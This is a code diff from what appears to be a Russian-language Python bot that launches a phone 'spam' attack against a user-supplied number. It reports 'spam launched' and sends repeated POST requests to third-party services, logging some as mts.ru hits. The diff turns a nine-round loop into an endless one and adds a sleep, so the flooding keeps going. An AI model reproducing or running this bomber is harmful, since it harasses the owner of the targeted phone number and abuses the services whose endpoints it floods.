@@ -107,9 +107,9 @@ try:
                         i = ca.read()
                         i = int(i)
                     write_message(user, '💣 Спам запущен!')
-                    write_message(user, "Номер: " f'{userr}' "\nВремя: 2 минуты!")
+                    write_message(user, "Номер: " f'{userr}' "\nВремя: 1 минуту!")
                     c = 0
-                    while 9 > c:
+                    while True:
                         c +=1
                         try:
                             requests.post(
@@ -314,7 +314,7 @@ try:
                             print(colored('mts.ru-[+]', 'cyan'))
                         except:
                             print(colored('mts.ru-[-]', 'cyan'))
-                  
+                    time.sleep(60)
                     suserr.remove(str(user))
                     for s in suserr:
                         file = open('bazan.txt', 'a', encoding='utf-8')
